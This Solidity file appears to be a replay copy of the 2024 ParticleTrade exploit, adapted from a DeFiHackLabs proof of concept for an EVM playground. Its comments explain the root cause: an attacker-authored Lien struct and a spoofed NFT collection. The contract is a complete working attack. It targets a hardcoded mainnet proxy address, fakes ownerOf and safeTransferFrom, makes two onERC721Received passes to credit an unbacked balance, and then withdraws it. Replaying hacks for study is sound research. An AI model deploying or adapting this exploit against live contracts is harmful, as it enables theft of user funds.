// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Synthetic standalone exploit for the EVM Playground (2024-02-ParticleTrade).
// The DeFiHackLabs PoC runs the entire attack INLINE in the Foundry test contract
// (ContractTest implements onERC721Received, ownerOf, and safeTransferFrom itself,
// and `attacker == address(this)`), so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit -> attack, plus the ownerOf/safeTransferFrom callback stubs) so the
// playground can deploy it and record attack(). Logic and constants are copied
// verbatim from test/ParticleTrade_exp.sol.
//
// Root cause: ParticleExchange's onERC721Received push-based accept-bid branch
// credits accountBalance[lien.borrower] += lien.tokenId + amount - lien.price
// from an attacker-authored Lien struct. offerBid() lets the caller freely choose
// `collection` (== msg.sender of the later onERC721Received call), so every
// "is this a real NFT / real collection" guard (ownerOf, msg.sender == collection)
// resolves against the attacker's own contract. Two onERC721Received passes are
// needed: the first rewrites liens[lienId].tokenId to the desired ETH amount, the
// second presents that rewritten struct and triggers the unbacked credit.

interface IParticleExchange {
    function offerBid(address collection, uint256 margin, uint256 price, uint256 rate)
        external
        returns (uint256 lienId);
    function onERC721Received(address, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
    function withdrawAccountBalance() external;
    function accountBalance(address account) external returns (uint256 balance);

    struct Lien {
        address lender; // NFT supplier address
        address borrower; // NFT trade executor address
        address collection; // NFT collection address
        uint256 tokenId; // NFT ID  (@dev: at borrower bidding, this field is used to store margin)
        uint256 price; // NFT supplier's desired sold price
        uint256 rate; // APR in bips
        uint256 loanStartTime; // loan start block.timestamp
        uint256 auctionStartTime; // auction start block.timestamp
    }
}

contract ParticleTradeExploit {
    address constant ZERO = 0x0000000000000000000000000000000000000000;
    IParticleExchange constant PROXY = IParticleExchange(0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D);
    address constant RESERVOIR = 0xC2c862322E9c97D6244a3506655DA95F05246Fd8;

    // Mirrors ContractTest.ownerofaddr - starts pointed at the proxy so the first
    // ownerOf() check in _pushBasedNftSupply passes (that check runs inside
    // ParticleExchange via delegatecall, so "address(this)" there is the proxy);
    // the fake safeTransferFrom zeroes it out afterwards (mirrors the real NFT
    // leaving "this contract").
    address ownerofaddr = address(PROXY);

    // step 0-4 of testExploit(), unmodified control flow / constants.
    function attack() external {
        uint256 tokenId = 50_126_827_091_960_426_151;
        uint256 tokenId2 = 19_231_446;

        // step 0: mint a free lien - collection = borrower = address(this)
        uint256 lienId = PROXY.offerBid(address(this), uint256(0), uint256(0), uint256(0));

        // step 1: first accept-bid pass - lien.tokenId = 0 hash-matches liens[lienId]
        // as written by offerBid; this pass rewrites liens[lienId].tokenId to the
        // large "margin" value below via _acceptBidSellNftToMarketLienUpdate.
        IParticleExchange.Lien memory lien = IParticleExchange.Lien({
            lender: ZERO,
            borrower: address(this),
            collection: address(this),
            tokenId: 0,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });
        uint256 amount = 0;
        bytes memory bytecode = (abi.encode(lien, lienId, amount, RESERVOIR, ZERO, "0x"));
        PROXY.onERC721Received(ZERO, ZERO, tokenId, bytecode);

        // step 2: second accept-bid pass - presents the REWRITTEN lien
        // (tokenId = 50.12 ETH margin, loanStartTime = now) so the hash still
        // matches liens[lienId]; this triggers the unbacked credit at L792:
        // accountBalance[lien.borrower] += lien.tokenId + amount - lien.price.
        IParticleExchange.Lien memory lien2 = IParticleExchange.Lien({
            lender: ZERO,
            borrower: address(this),
            collection: address(this),
            tokenId: tokenId,
            price: 0,
            rate: 0,
            loanStartTime: block.timestamp,
            auctionStartTime: 0
        });
        bytes memory bytecode2 = (abi.encode(lien2, lienId, amount, RESERVOIR, ZERO, "0x"));
        ownerofaddr = address(PROXY);
        PROXY.onERC721Received(ZERO, ZERO, tokenId2, bytecode2);

        // step 3-4: read then withdraw the minted credit.
        PROXY.accountBalance(address(this));
        PROXY.withdrawAccountBalance();
    }

    // Spoofed "is the NFT really here" check inside ParticleExchange's
    // _pushBasedNftSupply - msg.sender there is THIS contract (the fake
    // collection), so returning the proxy address satisfies
    // `IERC721(msg.sender).ownerOf(tokenId) == address(this)` from the proxy's view.
    function ownerOf(uint256 /* tokenId */ ) external view returns (address owner) {
        return ownerofaddr;
    }

    // Spoofed "sell the NFT to the marketplace" call - routed to this contract
    // (the fake collection) instead of a real ERC721, so it's a no-op; it just
    // flips ownerofaddr to zero so the post-trade ownerOf() check also passes.
    function safeTransferFrom(address, /* from */ address, /* to */ uint256, /* tokenId */ bytes calldata /* _data */ )
        external
    {
        ownerofaddr = address(0);
    }

    receive() external payable {}
}
